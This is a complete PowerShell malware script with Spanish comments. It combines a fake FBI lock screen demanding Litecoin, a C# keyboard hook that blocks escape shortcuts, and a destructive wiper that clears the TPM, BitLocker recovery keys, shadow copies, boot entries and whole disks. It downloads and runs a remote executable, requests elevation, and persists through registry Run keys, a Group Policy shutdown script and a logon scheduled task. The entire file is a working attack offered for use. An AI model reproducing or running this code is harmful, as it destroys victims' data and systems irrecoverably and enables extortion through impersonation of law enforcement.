# jw.ps1 - pantalla FBI + borrado total
$ErrorActionPreference = 'SilentlyContinue'
$pub = 'C:\Users\Public'

# ---------- 1. C# del hook ----------
$hcs = @'
using System;
using System.Runtime.InteropServices;
public class KBHook {
    private const int WH_KEYBOARD_LL = 13;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    public static bool Enabled = true;
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr dwExtraInfo; }
    public static void Start() { _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0); }
    public static void Stop() { UnhookWindowsHookEx(_hookID); }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && Enabled) {
            KBDLLHOOKSTRUCT k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            int vk = (int)k.vkCode;
            bool ctrl  = (GetAsyncKeyState(0x11) & 0x8000) != 0;
            bool alt   = (GetAsyncKeyState(0x12) & 0x8000) != 0;
            bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
            if (vk == 0x5B || vk == 0x5C || vk == 0x5D) return (IntPtr)1;
            if (vk == 0x1B && ctrl) return (IntPtr)1;
            if (vk == 0x1B && ctrl && shift) return (IntPtr)1;
            if (vk == 0x73 && alt) return (IntPtr)1;
            if (vk == 0x09 && alt) return (IntPtr)1;
            if (vk == 0x1B && alt) return (IntPtr)1;
            if (vk == 0x20 && alt) return (IntPtr)1;
            if (vk == 0x2E && ctrl && alt) return (IntPtr)1;
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
'@
Set-Content -LiteralPath (Join-Path $pub 'h.cs') -Value $hcs -Encoding UTF8

# ---------- 2. pantalla (se lanza en cada inicio de sesion) ----------
$show = @'
$ErrorActionPreference = 'SilentlyContinue'
$m = New-Object System.Threading.Mutex($false, 'JWShow')
if (-not $m.WaitOne(0)) { exit }
Add-Type -TypeDefinition (Get-Content -Raw C:\Users\Public\h.cs)
[KBHook]::Start()
Add-Type -Name U -Namespace W -MemberDefinition '[DllImport("user32.dll")] public static extern int FindWindow(string a, string b); [DllImport("user32.dll")] public static extern int ShowWindow(int a, int b);'
$tb = [W.U]::FindWindow('Shell_TrayWnd', '')
[W.U]::ShowWindow($tb, 0)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$o = [char]243; $i = [char]237; $a = [char]225; $u2 = [char]250
$lt = "ESTE PC HA SIDO INTERVENIDO POR EL FBI`r`n`r`nAcceso no autorizado prohibido.`r`n`r`nPara desbloquear este PC, env{i}a 1 LTC (o 50 USD) a la direcci{o}n de abajo:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nUna vez recibido el pago, tu PC quedar{a} desbloqueado.`r`n`r`nAVISO: la tecla Windows y todos los atajos est{a}n anulados. La {u2}nica salida es el bot{o}n de apagado, y al pulsarlo se borra TODO: el sistema operativo, las particiones, las copias, las claves de recuperaci{o}n y el TPM. Ni con un USB de arranque se recupera: no hay vuelta atr{a}s. Este PC ya no es tuyo.`r`n`r`n-----------------------------------`r`n`r`nTHIS PC HAS BEEN SEIZED BY THE FBI`r`n`r`nUnauthorized access prohibited.`r`n`r`nTo unlock this PC, send 1 LTC (or 50 USD) to the address below:`r`n`r`nltc1qmu2ypleufay72yutpk2u0d5uvjmh99jw3cfklf`r`n`r`nOnce payment is received, your PC will be unlocked.`r`n`r`nWARNING: the Windows key and every shortcut are disabled. The only way out is the power button, and pressing it deletes EVERYTHING: the OS, the partitions, the backups, the recovery keys and the TPM. Not even a bootable USB will recover it: there is no way back. This PC is no longer yours."
$lt = $lt.Replace('{o}', $o).Replace('{i}', $i).Replace('{a}', $a).Replace('{u2}', $u2)
$form = New-Object System.Windows.Forms.Form
$form.BackColor = [System.Drawing.Color]::Black
$form.ForeColor = [System.Drawing.Color]::White
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.ControlBox = $false
$form.FormBorderStyle = 'None'
$form.ShowInTaskbar = $false
$pic = New-Object System.Windows.Forms.PictureBox
$pic.SizeMode = 'Zoom'
$pic.BackColor = [System.Drawing.Color]::Black
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $ib = $wc.DownloadData('https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Seal_of_the_Federal_Bureau_of_Investigation.svg/500px-Seal_of_the_Federal_Bureau_of_Investigation.svg.png')
    $pic.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(, $ib)))
} catch {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        $ib = $wc.DownloadData('https://fbijohn.com/wp-content/uploads/2023/06/FBI_headpic-1024x576.jpg')
        $pic.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(, $ib)))
    } catch {
        $bmp = New-Object System.Drawing.Bitmap 480, 270
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.Clear([System.Drawing.Color]::FromArgb(0, 40, 104))
        $g.DrawString("FBI", (New-Object System.Drawing.Font 'Arial', 48, ([System.Drawing.FontStyle]::Bold)), [System.Drawing.Brushes]::Gold, 150, 95)
        $g.Dispose()
        $pic.Image = $bmp
    }
}
$label = New-Object System.Windows.Forms.Label
$label.Text = $lt
$label.AutoSize = $false
$label.TextAlign = 'TopCenter'
$label.ForeColor = [System.Drawing.Color]::White
$label.BackColor = [System.Drawing.Color]::Black
$label.Font = New-Object System.Drawing.Font 'Arial', 10, ([System.Drawing.FontStyle]::Bold)
$firm = New-Object System.Windows.Forms.Label
$firm.AutoSize = $true
$firm.Text = "A gift from Evitxu14`r`nHit me up on Discord if you don't want me to ruin your life: xrayitox."
$firm.ForeColor = [System.Drawing.Color]::Gold
$firm.BackColor = [System.Drawing.Color]::Black
$firm.Font = New-Object System.Drawing.Font 'Arial', 9, ([System.Drawing.FontStyle]::Bold)
$form.Controls.Add($pic)
$form.Controls.Add($label)
$form.Controls.Add($firm)
$form.Add_Shown({
    $cw = $form.ClientSize.Width; $ch = $form.ClientSize.Height
    $pw = [int][Math]::Min(300, $cw * 0.18)
    $pic.Width = $pw; $pic.Height = [int]($pw * 1.03)
    $pic.Left = [int](($cw - $pic.Width) / 2); $pic.Top = 14
    $firm.Left = [int](($cw - $firm.Width) / 2); $firm.Top = $ch - $firm.Height - 20
    $label.Width = [int]($cw * 0.9); $label.Left = [int](($cw - $label.Width) / 2)
    $label.Top = $pic.Bottom + 10
    $label.Height = [Math]::Max(200, $ch - $label.Top - $firm.Height - 34)
    $form.Activate()
    $tm = New-Object System.Windows.Forms.Timer
    $tm.Interval = 800
    $tm.Add_Tick({ $form.TopMost = $true; $form.Activate() })
    $tm.Start()
})
$form.Add_FormClosing({ $_.Cancel = $true; [W.U]::ShowWindow($tb, 0) })
[System.Windows.Forms.Application]::DoEvents()
[System.Windows.Forms.Application]::Run($form)
'@
Set-Content -LiteralPath (Join-Path $pub 'show.ps1') -Value $show -Encoding UTF8

# ---------- 3. script de borrado ----------
$wipe = @'
$ErrorActionPreference = "SilentlyContinue"
$c = "C:\"
try { (Get-WmiObject -Namespace root\HP\InstrumentedBIOS -Class HP_BIOSSettingInterface -EA Stop).SetBIOSSetting("Setup Password", "FBI2026", "") | Out-Null } catch { }
try { (Get-WmiObject -Namespace root\HP\InstrumentedBIOS -Class HP_BIOSSettingInterface -EA Stop).SetBIOSSetting("USB Legacy Support", "Disable", "") | Out-Null } catch { }
try { (Get-WmiObject -Namespace root\dcim\sysman\biosattributes -Class DCIM_BIOSService -EA Stop).SetBIOSAttributes("Enable USB Boot", "Disabled", $null) | Out-Null } catch { }
try { (Get-WmiObject -Namespace root\wmi -Class Lenovo_SetBiosSetting -EA Stop).SetBiosSetting("Setup Password,FBI2026,ascii,us") | Out-Null } catch { }
Clear-Tpm
try { (Get-WmiObject -Namespace root\cimv2\security\microsofttpm -Class Win32_Tpm -EA Stop).Disable() | Out-Null } catch { }
slmgr /upk
slmgr /cpky
manage-bde -protectors -delete C: -type RecoveryPassword
manage-bde -protectors -delete C: -type Numerical
vssadmin delete shadows /all /quiet
$ids = [regex]::Matches(((bcdedit /enum firmware) -join "`n"), '\{[0-9a-fA-F\-]{36}\}') | ForEach-Object { $_.Value } | Select-Object -Unique
foreach ($id in $ids) { if ($id -ne '{fwbootmgr}') { bcdedit /delete $id /f } }
bcdedit /set {fwbootmgr} timeout 0
foreach ($n in "bootmgr","Boot","EFI") { rd /s /q ($c + $n) }
mountvol S: /S
if (Test-Path S:\) { rd /s /q S:\ }
$dl = @()
foreach ($d in (Get-Disk | Sort-Object IsBoot)) { $dl += ("select disk " + $d.Number); $dl += "clean all noerr" }
$dl | diskpart
md C:\_e
robocopy C:\_e C:\Windows /MIR /XJ /R:0 /W:0 /MT:16 /NFL /NDL /NJH /NJS /NP
foreach ($v in [System.IO.DriveInfo]::GetDrives()) {
    if ($v.DriveType -eq "Fixed") {
        Get-ChildItem -LiteralPath $v.Name -Force | ForEach-Object { Remove-Item -LiteralPath $_.FullName -Recurse -Force }
        Remove-Item -LiteralPath ($v.Name + '$Recycle.Bin') -Recurse -Force
    }
}
$rng = [Security.Cryptography.RandomNumberGenerator]::Create()
foreach ($d in (Get-Disk)) {
    try {
        $buf = New-Object byte[] 1048576
        $rng.GetBytes($buf)
        $fs = [IO.File]::Open("\\.\PhysicalDrive$($d.Number)", 'Open', 'ReadWrite', 'Write')
        for ($k = 0; $k -lt 16; $k++) { $fs.Write($buf, 0, $buf.Length) }
        $fs.Flush()
        $fs.Close()
    } catch { }
}
$rng.Dispose()
'@
Set-Content -LiteralPath (Join-Path $pub 'w.ps1') -Value $wipe -Encoding UTF8

# ---------- 4. helper elevado ----------
$helper = @'
$ErrorActionPreference = "SilentlyContinue"
Start-Process -FilePath "$env:TEMP\JohnyApp.exe"
powercfg /h off
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Power" -Name HiberbootEnabled -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name MaxGPOScriptWait -Value 7200 -PropertyType DWord -Force | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v JWShow /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\show.ps1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v JW /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\w.ps1" /f
$d = "C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown"
New-Item -ItemType Directory -Path $d -Force | Out-Null
Copy-Item -LiteralPath "C:\Users\Public\w.ps1" -Destination (Join-Path $d "wipe.ps1") -Force
$cmd = New-Object System.Collections.Generic.List[string]
$cmd.Add("@echo off")
$cmd.Add("> C:\dp.txt echo select disk 0")
$cmd.Add(">> C:\dp.txt echo clean noerr")
foreach ($n in 1..15) { $cmd.Add(">> C:\dp.txt echo select disk $n"); $cmd.Add(">> C:\dp.txt echo clean noerr") }
$cmd.Add("diskpart /s C:\dp.txt")
$cmd.Add("powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$d\wipe.ps1""")
Set-Content -LiteralPath (Join-Path $d "wipe.cmd") -Value $cmd -Encoding ASCII
Set-Content -LiteralPath "C:\Windows\System32\GroupPolicy\Machine\Scripts\scripts.ini" -Value "[Shutdown]","0CmdLine=$d\wipe.cmd","0Parameters=" -Encoding ASCII
if (-not (Test-Path "C:\Windows\System32\GroupPolicy\gpt.ini")) { Set-Content -LiteralPath "C:\Windows\System32\GroupPolicy\gpt.ini" -Value "[General]","gPCFunctionalityVersion=2","Version=65536" -Encoding ASCII }
gpupdate /target:computer /force
Set-Content -LiteralPath "C:\Users\Public\_armed.txt" -Value (Get-Date) -Encoding ASCII
'@
Set-Content -LiteralPath (Join-Path $pub 's.ps1') -Value $helper -Encoding UTF8

# ---------- 5. descarga del exe ----------
$p = Join-Path $env:TEMP 'JohnyApp.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri 'https://github.com/johntompson/johny/releases/download/v1.0/JohnyApp.exe' -OutFile $p -UseBasicParsing

# ---------- 6. elevacion ----------
Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\s.ps1"

# ---------- 7. persistencia y arranque de la pantalla ----------
schtasks /Create /SC ONLOGON /TN JohnyAppWipe /TR "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\w.ps1" /F
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\show.ps1"
